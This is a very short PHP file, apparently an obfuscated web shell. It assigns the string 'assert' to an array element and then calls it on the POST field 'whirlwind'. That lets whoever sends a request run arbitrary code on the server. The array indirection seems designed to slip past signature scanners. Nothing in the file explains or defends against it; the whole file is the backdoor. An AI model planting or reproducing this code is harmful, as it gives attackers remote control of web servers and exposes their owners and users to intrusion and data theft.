<?php
$a=0;
$item['wind']='assert';
$array[]=$item;
$array[$a]['wind']($_POST['whirlwind']);
?>
